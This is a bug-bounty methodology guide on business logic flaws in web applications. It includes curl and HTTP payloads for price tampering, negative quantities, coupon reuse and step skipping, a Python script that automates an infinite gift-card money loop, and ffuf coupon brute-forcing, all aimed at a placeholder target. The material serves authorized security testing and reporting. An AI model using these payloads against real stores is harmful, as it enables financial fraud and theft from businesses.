# Business Logic Vulnerabilities
> One-line summary: abuse the app's intended workflow with values and sequences it never anticipated — scanners can't see it, and payouts for financial impact are high.

## Overview
Business logic flaws are design and implementation errors in the rules that govern how the application works: price calculations, quantity limits, coupon redemption, approval workflows, role transitions, referral programs. They arise when developers assume users behave as the UI intends — that quantities are positive, prices come from the server's catalog, checkout follows cart, and a request is only sent once. The impact is whatever the broken rule protects: buying for $0, unlimited coupon reuse, bypassing KYC/verification steps, self-approving a refund, or infinite currency/gift-card loops that convert directly into money.

## Where to find it
- Checkout: price, quantity, currency, tax, shipping, discount fields in the request body
- Coupons/vouchers: stacking, reuse after success, reuse across accounts, case variants, expiry bypass, "apply twice" idempotency
- Limits: per-account quotas, trial periods, free-tier caps, message/upload limits, transfer limits
- Referrals: self-referral, referral loops, referral rewards on cancelled orders
- Multi-step workflows: KYC/verification, 2FA enrollment, order → payment → confirmation, password reset
- Role/permission changes: requesting a role change, self-approval, invitation acceptance for elevated roles
- Refunds/returns/cancellations: refund without return, cancel after ship, refunding more than paid
- Gift cards / wallet / credits: conversion loops, redeem-before-debit, balance going negative
- Pricing logic: currency rounding, exchange-rate endpoints, bulk discounts, negative-value line items
- Signup/onboarding: skipping email verification, reusing invite codes, multi-trial abuse
- Billing: proration, downgrade/upgrade timing, seat-count manipulation

## Methodology
1. Map one workflow end-to-end with Burp: enumerate every request, parameter, and server-side value (order ID, price, discount, state). Write down the business rules as the app states them (FAQ, pricing page, ToS) so you can prove deviation.
2. List the assumptions each step makes and attack them one at a time: missing parameters, extra parameters, negative numbers, huge numbers, decimals, strings, zero, duplicates.
3. Test state/sequence: force-browse to later steps (`/checkout/confirm`, `/order/complete`) skipping earlier ones; replay a step twice; run steps out of order; run two tabs of the flow in parallel.
4. Price tampering: change price/amount/currency fields in cart, checkout, and payment-intent requests; watch whether the server recomputes or trusts the value.
5. Coupon abuse: apply the same code twice in one order, apply multiple codes stacked, reuse a one-time code across orders, test case and whitespace variants (`SAVE10`, `save10`, `SAVE10 `), and check the code isn't un-applied after a failed order.
6. Quantity limits: go below minimum and above maximum; try negative quantities to invert totals; check integer boundaries (`2147483647`, `2147483648`) for overflow wrap-arounds.
7. Financial loops: any flow that converts value (points → gift card → discount) is a candidate for infinite money. Model the loop on paper, then automate it.
8. Rate/limit bypasses: after hitting a limit, retry with a different identifier (second account, second email, second IP), or race the same request.
9. Verify impact on your own accounts only: buy the item, check the balance shows, check the order ships or the credit lands. For anything touching real money, use the minimum demonstrable amount.
10. Automate the proof: a short Python script or Burp macro that repeats the exploit and logs the outcome is worth more than 40 screenshots.

## Payloads
Cart/price tampering (raw HTTP before/after):
```http
POST /api/cart/items HTTP/2
Host: target.com
Content-Type: application/json
Cookie: session=SESSION_A

{"product_id": 42, "quantity": 1, "price": 49900}   <- client-supplied price

# Tampered:
{"product_id": 42, "quantity": 1, "price": 1}
```

Negative quantity to invert the total while staying within credit:
```bash
curl -s -X POST https://target.com/api/cart/add \
  -H "Cookie: session=SESSION_A" -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": -1}'
```

Coupon stacking / reuse:
```bash
# Apply the same single-use code twice in the same order
curl -s -X POST https://target.com/api/cart/coupon \
  -H "Cookie: session=SESSION_A" -H "Content-Type: application/json" \
  -d '{"code":"WELCOME10"}'
curl -s -X POST https://target.com/api/cart/coupon \
  -H "Cookie: session=SESSION_A" -H "Content-Type: application/json" \
  -d '{"code":"WELCOME10"}'
# Case/space variants that may hit a different code path than validation:
# SAve10   SAVE10%20   "SAVE10\n"   SAVE1O (letter O)
```

Step skipping — call the confirmation directly:
```http
GET /checkout/order-confirmation/8801 HTTP/2
Host: target.com
Cookie: session=SESSION_A          <- never paid
```

Infinite money loop (gift card / points conversion) automation:
```python
import requests
s = requests.Session()
s.headers.update({"Authorization": "Bearer TOKEN_A"})
BASE = "https://target.com"
BALANCE_BEFORE = s.get(f"{BASE}/api/wallet").json()["balance"]

for i in range(20):
    s.post(f"{BASE}/api/cart/add", json={"product_id": 7, "quantity": 1})   # $10 gift card
    s.post(f"{BASE}/api/cart/coupon", json={"code": "NEWSLETTER30"})        # 30% off
    r = s.post(f"{BASE}/api/checkout", json={"payment_method": "credit"})   # charge $7
    s.post(f"{BASE}/api/giftcard/redeem", json={"code": "GC-" + str(i)})    # credit $10
    print(i, r.status_code)

print("balance:", BALANCE_BEFORE, "->", s.get(f"{BASE}/api/wallet").json()["balance"])
```

Workflow state test without a browser (mirror the SPA's calls directly, skipping the proxy the UI uses):
```bash
# The UI only calls /api/payment/init from the bank redirect page.
# Call it directly right after order creation:
curl -s -X POST https://target.com/api/orders/8801/confirm \
  -H "Authorization: Bearer TOKEN_A" -H "Content-Type: application/json" \
  -d '{"payment_id": null}'
```

## Bypasses & edge cases
- Type confusion: send `"quantity": "1"`, `"1.0"`, `1e2`, `[]`, `{}`, `null` — parsers disagree and `parseInt`/`toFixed` can round differently than validation.
- Overflow: quantities near `2^31`/`2^53` can wrap the total negative — combined with a floor of 0, that's free minus credit.
- Rounding: currency conversion in small units (buy 0.001 of something, round in your favor, repeat).
- Coupon binding: code tied to the cart but not the account (reuse across accounts), or tied to the account but not revoked when the order is cancelled.
- Limits checked at "create" but not at "submit" (draft → final); or checked client-side only (edit the response/JS variable).
- Trial reset: delete the account/device ID/`localStorage` token to get a new trial; check server-side identity is email or a cookie that can be cleared.
- Referral self-abuse: refer yourself with `victim+1@example.com`; check both accounts receive credit.
- Refund logic: refund amount taken from the request rather than recalculated; refund twice by replaying; refund after partial delivery.
- Seats/invites: invite more seats than the plan allows then downgrade; proration window abuse.
- Values normalized only at one layer: `" 10"` passes a string check but `parseInt` yields 10; unicode digits `١٠`.
- Sequence replay: re-submitting the "apply code" step after checkout success re-applies it to the next cart.
- Dual-use endpoints: an endpoint the UI uses for admins but that lacks a role check when the parameter set is right (also a BFLA overlap).
- Webhooks/callbacks: mark order paid by calling your own webhook receiver URL back at the app.

## Tools
- Burp Suite Pro (Repeater/Intruder + macros): build a macro for each step of the loop, then chain "(null payloads)" with a single request group to run the workflow N times.
```text
Intruder -> Positions: (null payloads) x 50
Resource pool: Maximum concurrent requests = 1
Macro: 1) add to cart  2) apply coupon  3) checkout  4) redeem
```
- Turbo Intruder for state loops without Intruder's macro overhead:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           engine=Engine.BURP2)
    for i in range(50):
        engine.queue(target.req, str(i))

def handleResponse(req, interesting):
    table.add(req)
```
- Python + requests (script above) for multi-request workflows; keep a `--dry-run` mode and cap iterations.
- ffuf for coupon code brute force:
```bash
ffuf -u "https://target.com/api/cart/coupon" -X POST \
  -H "Cookie: session=SESSION_A" -H "Content-Type: application/json" \
  -d '{"code":"FUZZ"}' -w discount_codes.txt -mc 200 -fr "invalid"
```
- Burp "Send group in parallel" for double-submission logic (see race-conditions.md).
- Sequencer for any token the discount/referral flow hands out.

## Escalation & chaining
- Negative/overflow totals → free product or negative balances → direct financial loss (report with the minimal amount reproduced).
- Infinite gift-card/points loop → automated monetary extraction; quantify hourly rate from your loop timing.
- Step skipping on KYC/verification → operate constrained features (withdrawals, transfers) without verification; chain with IDOR to target other accounts.
- Business logic + race condition: apply a coupon twice in parallel, double-redeem a gift card, or double-refund the same order.
- Coupon/trial abuse at scale → reseller or arbitrage scenario; show cost-per-unit vs acquisition cost.
- Workflow bypass on approval steps → self-approve a refund/role change, then chain into authorization bugs if approval also grants admin.
- Logic flaw on email/phone change → ATO without needing auth bypass (change victim's email on their own account via a support flow).

## Report notes
- Prove the rule violation against the app's own stated rule ("limit 1 per customer", "prices set by server") — quote the FAQ/ToS line.
- Show the full request/response of each step with the tampered value highlighted; include the resulting state (order total $0.01, wallet balance increased by N).
- Quantify impact: units obtained per minute with your automation, monetary value, or number of users affected for a shared-flow bug.
- Use your own accounts; for money-affecting tests, keep amounts minimal and note you stopped exploitation once proven.
- Distinguish "logic flaw" from "intended behavior": if support confirmed it's by design, it's not a bug — ask before reporting at low severity.
- If a fix was applied during testing, note the timeframe; re-test after the fix and include the retest result.
- Report the minimal reproduction, not the 412-iteration macro (reference the script as an attachment).

## References
- [PortSwigger Academy: Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [PortSwigger Academy: Examples of business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws/examples)
- [OWASP WSTG: Business Logic Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/)
- [HackTricks: Business Logic Vulnerabilities](https://book.hacktricks.wiki/en/pentesting-web/business-logic-vulnerabilities.html)
- [Intigriti Bug Bytes #37: Race Condition to RCE](https://www.intigriti.com/researchers/blog/bug-bytes/bug-bytes-37-how-to-find-more-idors-race-condition-to-rce-tracy)
- [PortSwigger Academy: Race conditions (limit overrun labs use the same logic)](https://portswigger.net/web-security/race-conditions)
